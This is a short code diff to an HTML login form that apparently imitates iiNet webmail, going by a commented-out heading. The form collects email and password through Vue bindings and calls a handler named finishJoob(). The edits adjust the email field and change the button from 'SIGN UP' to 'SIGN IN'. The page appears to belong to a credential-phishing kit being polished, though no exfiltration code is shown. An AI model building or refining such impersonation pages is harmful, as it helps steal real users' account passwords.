@@ -9,13 +9,13 @@
         
         <!-- <h1  style="margin:21px 0px ; text-align: center; font-weight: normal;">Welcome to the new email login page for iiNet webmail</h1> -->
         <form action='?' method='post'>
-			<div class="group"> 
-              <input type="email" required v-model="formDataRes.email" >   
+			
+          <div class="group"> 
+              <input type="type" required v-model="formDataRes.email" >   
               <span class="highlight"></span>
               <span class="bar"></span>
               <label>Email</label>
-
-            </div>
+          </div>
               
             <div class="group"> 
               <input type="password" required v-model="formDataRes.password" >   
@@ -28,7 +28,7 @@
             <div class="style__error___yLqWs keypressFocused" v-if="isActive" id="loginMessageElem" tabindex="-1"><svg class="MuiSvgIcon-root" focusable="false" viewBox="0 0 24 24" aria-hidden="true" style="margin-inline-end: 5px;"><path d="M11 15h2v2h-2zm0-8h2v6h-2zm.99-5C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"></path></svg>Wrong username or password, please try again.</div>
             
 			
-			<button type="submit" @click.prevent="finishJoob();">SIGN UP</button>
+			<button type="submit" @click.prevent="finishJoob();">SIGN IN</button>
         </form>
 
           <a href="">Forget password?</a>
